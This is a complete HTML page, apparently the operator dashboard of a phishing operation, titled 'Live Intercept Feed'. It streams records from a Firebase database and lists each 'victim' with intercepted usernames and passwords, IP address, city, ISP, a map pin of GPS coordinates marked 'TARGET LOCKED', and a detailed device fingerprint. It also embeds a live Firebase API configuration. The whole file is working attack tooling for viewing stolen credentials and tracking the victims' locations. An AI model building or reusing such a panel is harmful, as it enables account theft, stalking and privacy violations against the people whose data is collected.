<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Intercept - Live Feed</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; scrollbar-width: thin; scrollbar-color: #22c55e #000000; }
        *::-webkit-scrollbar { width: 6px; }
        *::-webkit-scrollbar-track { background: #000000; }
        *::-webkit-scrollbar-thumb { background: #22c55e; border-radius: 4px; }

        body { 
            font-family: 'JetBrains Mono', monospace; 
            background-color: #050505; color: #e4e4e7; min-height: 100vh;
            background-image: linear-gradient(rgba(34, 197, 94, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(34, 197, 94, 0.03) 1px, transparent 1px);
            background-size: 20px 20px;
        }
        .terminal-header { border-bottom: 1px solid #22c55e; box-shadow: 0 4px 20px rgba(34, 197, 94, 0.1); position: relative; }
        
        .date-group { border: 1px solid #27272a; background: rgba(9, 9, 11, 0.9); border-radius: 6px; margin-bottom: 24px; overflow: hidden; }
        .date-group[open] { border-color: #3f3f46; }
        .date-summary { padding: 12px 16px; background: #18181b; cursor: pointer; font-weight: 700; color: #22c55e; display: flex; justify-content: space-between; align-items: center; list-style: none; border-bottom: 1px solid #27272a; }
        .date-summary::-webkit-details-marker { display: none; }
        .date-summary:hover { background: #27272a; }

        .victim-card { border: 1px solid #27272a; border-left: 3px solid #ef4444; background: #000000; margin: 10px 16px; border-radius: 4px; overflow: hidden; }
        .victim-card[open] { border-left-color: #ef4444; box-shadow: 0 0 15px rgba(239, 68, 68, 0.15); }
        .victim-summary { padding: 12px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; list-style: none; background: #09090b; }
        .victim-summary::-webkit-details-marker { display: none; }
        .victim-summary:hover { background: #18181b; }

        /* Nouveau design de données */
        .dossier-section { border-bottom: 1px solid #27272a; padding: 16px; }
        .dossier-title { font-size: 0.7rem; font-weight: 800; color: #71717a; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
        
        .cred-card { background: #1c1917; border: 1px dashed #ef4444; border-radius: 6px; padding: 12px; }
        .cred-item { display: flex; justify-content: space-between; align-items: center; padding: 8px 0; border-bottom: 1px solid #27272a; }
        .cred-item:last-child { border-bottom: none; }
        .cred-label { font-size: 0.75rem; color: #a1a1aa; font-weight: bold; }
        .cred-value { font-size: 1rem; color: #fbbf24; font-weight: bold; font-family: monospace; }
        
        .reveal-btn { font-size: 0.65rem; background: #ef4444; color: white; padding: 4px 8px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-left: 12px; transition: 0.2s; }
        .reveal-btn:hover { background: #b91c1c; }

        .info-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
        @media (min-width: 768px) { .info-grid { grid-template-columns: repeat(4, 1fr); } }
        
        .info-box { background: #09090b; border: 1px solid #18181b; border-radius: 6px; padding: 10px; }
        .info-label { font-size: 0.6rem; color: #71717a; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 4px; }
        .info-value { font-size: 0.8rem; color: #d4d4d8; font-weight: bold; word-break: break-all; }
        .info-value.green { color: #22c55e; }
        .info-value.red { color: #ef4444; }
        .info-value.blue { color: #3b82f6; }

        .blink { animation: blink 1s step-end infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
        .logo-glow { text-shadow: 0 0 10px rgba(34, 197, 94, 0.4); }
    </style>
</head>
<body class="p-4 sm:p-8">

    <div class="max-w-6xl mx-auto mb-8 terminal-header pb-4">
        <div class="flex justify-between items-start mb-2">
            <div class="flex items-center gap-3">
                <div class="w-3 h-3 rounded-full bg-red-500 animate-pulse"></div>
                <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
                <div class="w-3 h-3 rounded-full bg-green-500"></div>
                <span class="text-zinc-500 text-xs ml-2">root@system:~/intercept</span>
            </div>
            <div class="text-xl md:text-2xl font-black tracking-widest uppercase logo-glow">
                <span class="text-white">Level</span><span class="text-green-500">Up</span><span class="text-white blink">_</span>
            </div>
        </div>
        <h1 class="text-2xl md:text-3xl font-extrabold text-white tracking-widest uppercase mt-4">Live Intercept Feed</h1>
        <div class="mt-4 flex gap-4 text-xs">
            <div class="text-zinc-400">Status: <span class="text-green-500 font-bold">ACTIVE</span></div>
            <div class="text-zinc-400">Total Targets: <span id="total-count" class="text-red-500 font-bold">0</span></div>
        </div>
    </div>

    <div class="max-w-6xl mx-auto">
        <div id="log-container">
            <div class="text-center py-20 text-zinc-600">
                <div class="w-10 h-10 border-2 border-zinc-800 border-t-green-500 rounded-full animate-spin mx-auto mb-4"></div>
                <p class="text-sm">Awaiting incoming connections...</p>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getFirestore, collection, onSnapshot, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyA3LiNjxsV9HTcFd2ghlItTipted9rdQkU",
            authDomain: "test-9022.firebaseapp.com",
            projectId: "test-9022",
            storageBucket: "test-9022.firebasestorage.app",
            messagingSenderId: "945536290936",
            appId: "1:945536290936:web:de1437cea95e63cb559d8d",
            measurementId: "G-RSKK2KZDQR"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        const seenIds = new Set();
        let firstLoad = true;

        const q = query(collection(db, "visites_mysteres"), orderBy("date_clic", "desc"), limit(50));

        onSnapshot(q, (snapshot) => {
            const container = document.getElementById('log-container');
            const totalCount = document.getElementById('total-count');

            if (snapshot.empty) {
                container.innerHTML = `<div class="text-center py-20 text-zinc-600"><p class="text-sm">No data intercepted yet. Waiting for connection...</p></div>`;
                totalCount.textContent = '0';
                return;
            }

            const groupedData = {};

            snapshot.forEach((doc) => {
                const data = doc.data();
                const id = doc.id;
                const isNew = !firstLoad && !seenIds.has(id);
                seenIds.add(id);

                let dateObj = new Date();
                if (data.date_clic && data.date_clic.seconds) {
                    dateObj = new Date(data.date_clic.seconds * 1000);
                }

                const dateKey = dateObj.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
                const timeStr = dateObj.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

                if (!groupedData[dateKey]) groupedData[dateKey] = [];
                groupedData[dateKey].push({ id, isNew, timeStr, ...data });
            });

            container.innerHTML = '';
            let globalCount = 0;

            for (const [dateStr, victims] of Object.entries(groupedData)) {
                globalCount += victims.length;

                const dateGroup = document.createElement('details');
                dateGroup.className = 'date-group';
                if (dateStr === new Date().toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })) dateGroup.open = true;

                const dateHeader = document.createElement('summary');
                dateHeader.className = 'date-summary';
                dateHeader.innerHTML = `<div>📅 ${dateStr}</div><div class="text-xs bg-zinc-800 px-2 py-1 rounded text-zinc-300">${victims.length} target(s)</div>`;
                dateGroup.appendChild(dateHeader);

                victims.forEach(victim => {
                    const victimDetails = document.createElement('details');
                    victimDetails.className = 'victim-card';
                    if (victim.isNew) victimDetails.open = true;

                    const victimSummary = document.createElement('summary');
                    victimSummary.className = 'victim-summary';
                    victimSummary.innerHTML = `
                        <div class="flex items-center gap-3">
                            <span class="text-red-500 text-lg">►</span>
                            <div>
                                <div class="text-sm font-bold text-white">${victim.username || 'UNKNOWN_USER'}</div>
                                <div class="text-xs text-zinc-500 mt-1">${victim.ville || 'UNKNOWN_LOCATION'} · ${victim.type_appareil || 'UNKNOWN_DEVICE'}</div>
                            </div>
                        </div>
                        <div class="text-right">
                            <div class="text-xs text-green-500 font-bold">${victim.timeStr}</div>
                            ${victim.isNew ? '<span class="text-[10px] bg-red-600 text-white px-1.5 py-0.5 rounded animate-pulse mt-1 inline-block">NEW</span>' : ''}
                        </div>
                    `;
                    victimDetails.appendChild(victimSummary);

                    // --- LE DOSSIER COMPLET ---
                    const victimContent = document.createElement('div');
                    
                    let mapHtml = '';
                    if (victim.latitude && victim.longitude) {
                        mapHtml = `
                            <div class="mt-2 rounded-md overflow-hidden border border-zinc-800 relative">
                                <iframe class="w-full h-48" src="https://maps.google.com/maps?q=${victim.latitude},${victim.longitude}&z=14&output=embed" loading="lazy"></iframe>
                                <div class="absolute top-2 left-2 bg-red-600 text-white text-[10px] font-bold px-2 py-1 rounded">TARGET LOCKED</div>
                            </div>
                        `;
                    }

                    const safePassword = victim.password ? victim.password.replace(/\\/g, '\\\\').replace(/'/g, "\\'") : '';

                    victimContent.innerHTML = `
                        <!-- 1. IDENTIFIANTS -->
                        <div class="dossier-section bg-red-950/20">
                            <div class="dossier-title text-red-500"><span class="w-2 h-2 bg-red-500 rounded-full animate-ping"></span> INTERCEPTED CREDENTIALS</div>
                            <div class="cred-card">
                                <div class="cred-item">
                                    <span class="cred-label">USERNAME / EMAIL</span>
                                    <span class="cred-value">${victim.username || '-'}</span>
                                </div>
                                <div class="cred-item">
                                    <span class="cred-label">PASSWORD</span>
                                    <div class="flex items-center">
                                        <span class="cred-value" id="pw-${victim.id}">••••••••</span>
                                        <span class="reveal-btn" onclick="
                                            const el = document.getElementById('pw-${victim.id}');
                                            if(el.textContent === '••••••••') { el.textContent = '${safePassword}' || 'EMPTY'; } 
                                            else { el.textContent = '••••••••'; }
                                        ">REVEAL</span>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- 2. LOCALISATION -->
                        <div class="dossier-section">
                            <div class="dossier-title">📍 GEOLOCATION DATA</div>
                            <div class="info-grid mb-3">
                                <div class="info-box"><div class="info-label">IP Address</div><div class="info-value green">${victim.ip || 'Unknown'}</div></div>
                                <div class="info-box"><div class="info-label">City</div><div class="info-value">${victim.ville || 'Unknown'}</div></div>
                                <div class="info-box"><div class="info-label">Country</div><div class="info-value">${victim.pays || 'Unknown'}</div></div>
                                <div class="info-box"><div class="info-label">ISP</div><div class="info-value">${victim.isp || 'Unknown'}</div></div>
                            </div>
                            ${mapHtml}
                        </div>

                        <!-- 3. MATERIEL & RESEAU -->
                        <div class="dossier-section">
                            <div class="dossier-title">📱 DEVICE FINGERPRINT</div>
                            <div class="info-grid">
                                <div class="info-box"><div class="info-label">Device Model</div><div class="info-value">${victim.type_appareil || 'Unknown'}</div></div>
                                <div class="info-box"><div class="info-label">Screen Resolution</div><div class="info-value">${victim.resolution || 'Unknown'}</div></div>
                                <div class="info-box"><div class="info-label">CPU Cores</div><div class="info-value">${victim.cpu || 'Unknown'}</div></div>
                                <div class="info-box"><div class="info-label">RAM Memory</div><div class="info-value">${victim.ram || 'Unknown'}</div></div>
                                <div class="info-box"><div class="info-label">Battery Level</div><div class="info-value red">${victim.batterie || 'Unknown'}</div></div>
                                <div class="info-box"><div class="info-label">Battery Status</div><div class="info-value">${victim.etat_batterie || 'Unknown'}</div></div>
                                <div class="info-box"><div class="info-label">Network Type</div><div class="info-value blue">${victim.connexion || 'Unknown'}</div></div>
                                <div class="info-box"><div class="info-label">Language</div><div class="info-value">${victim.langue || 'Unknown'}</div></div>
                            </div>
                        </div>

                        <!-- 4. METADATA -->
                        <div class="dossier-section border-none pb-4">
                            <div class="dossier-title">⏱️ SESSION METADATA</div>
                            <div class="info-grid mb-2">
                                <div class="info-box col-span-2"><div class="info-label">Timestamp (Local)</div><div class="info-value">${victim.heure_locale || 'Unknown'}</div></div>
                            </div>
                            <div class="info-box">
                                <div class="info-label">Raw User Agent</div>
                                <div class="info-value text-xs text-zinc-500 font-normal mt-1">${victim.user_agent || 'Unknown'}</div>
                            </div>
                        </div>
                    `;
                    victimDetails.appendChild(victimContent);
                    dateGroup.appendChild(victimDetails);
                });
                container.appendChild(dateGroup);
            }
            totalCount.textContent = globalCount;
            firstLoad = false;
        });
    </script>
</body>
</html>
